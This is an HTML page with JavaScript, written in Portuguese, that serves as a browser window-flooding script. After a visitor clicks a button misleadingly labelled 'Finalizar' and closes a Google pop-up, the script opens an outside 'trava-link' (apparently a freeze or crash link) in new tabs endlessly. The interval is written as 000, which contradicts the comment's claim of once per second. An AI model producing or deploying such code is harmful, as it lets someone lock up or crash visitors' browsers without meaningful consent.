<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site com Pop-up e Loop</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background-color: #f5f5f5;
        }
        
        .container {
            text-align: center;
            padding: 30px;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            max-width: 500px;
        }
        
        h1 {
            color: #333;
            margin-bottom: 20px;
        }
        
        p {
            color: #666;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        
        .warning {
            color: #e74c3c;
            font-weight: bold;
            margin-bottom: 20px;
        }
        
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        button:hover {
            background-color: #2980b9;
        }
        
        .status {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        
        .active {
            background-color: #e74c3c;
            color: white;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Site com Pop-up e Loop</h1>
        <p>Clique no botão abaixo para iniciar o processo. Um pop-up será aberto para o Google.com. Após aceitar, um loop infinito começará a abrir o link especificado.</p>
        
        <div class="warning">
            AVISO: Este site abrirá múltiplas janelas. Use com cuidado!
        </div>
        
        <button id="finalizarBtn">Finalizar</button>
        
        <div id="status" class="status"></div>
    </div>

    <script>
        document.getElementById('finalizarBtn').addEventListener('click', function() {
            // Abre pop-up para o Google
            const popup = window.open('https://www.google.com', 'popup', 'width=600,height=400');
            
            // Atualiza status
            const status = document.getElementById('status');
            status.textContent = 'Pop-up aberto. Aceite-o para iniciar o loop...';
            status.className = 'status active';
            
            // Verifica se o pop-up foi bloqueado
            if (!popup || popup.closed || typeof popup.closed === 'undefined') {
                status.textContent = 'Pop-up bloqueado! Por favor, permita pop-ups para este site e tente novamente.';
                return;
            }
            
            // Aguarda o usuário interagir com o pop-up
            const checkPopup = setInterval(() => {
                if (popup.closed) {
                    clearInterval(checkPopup);
                    status.textContent = 'Pop-up fechado. Iniciando loop...';
                    
                    // Inicia o loop infinito
                    startInfiniteLoop();
                }
            }, 500);
        });
        
        function startInfiniteLoop() {
            const status = document.getElementById('status');
            status.textContent = 'Loop infinito iniciado!';
            
            // Função para abrir o link em loop
            function openLink() {
                window.open('https://trava-link.vercel.app/', '_blank');
            }
            
            // Abre o primeiro link imediatamente
            openLink();
            
            // Continua abrindo links a cada segundo
            setInterval(openLink, 000);
        }
    </script>
</body>
</html>
